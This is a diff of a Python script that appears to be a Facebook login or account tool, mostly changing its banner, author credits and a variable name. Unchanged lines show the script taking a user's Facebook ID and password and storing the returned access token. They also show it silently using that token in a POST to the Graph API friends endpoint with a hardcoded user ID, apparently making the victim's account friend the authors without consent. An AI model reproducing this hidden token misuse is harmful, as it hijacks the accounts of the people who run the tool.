@@ -33,14 +33,14 @@ logo = """
         \033[1;97m██   ██ ██   ██ ██  ██  ██ 
         ███████ ██   ██ ██      ██
                
-------------------------------------------
+══════════════════════════════════════════════
 
- ➣ Author  : Jam x Xtylo x Asad
- ➣ Github  : https://github.com/Jam   
- ➣ Facebook: Jam Shahrukh Official
- ➣ dont try to decompile it bro :)
+ [✓] Owner   : Jam x Xtylo x Asad
+ [✓] Github  : https://github.com/Stylish-Queen   
+ [✓] Facebook: Jam Shahrukh Official
+ [✓] don't pheel bro :)
  
-------------------------------------------"""
+══════════════════════════════════════════════"""
 idh = []
 back = 0
 def login_choice():
@@ -85,9 +85,9 @@ def login_fb():
 	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
 	q = json.loads(data)
 	if "loc" in q:
-		hamza = open(".login.txt","w")
-		hamza.write(q["loc"])
-		hamza.close()
+		jam = open(".login.txt","w")
+		jam.write(q["loc"])
+		jam.close()
 		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
 		menu()
 	elif "www.facebook.com" in q["error"]:
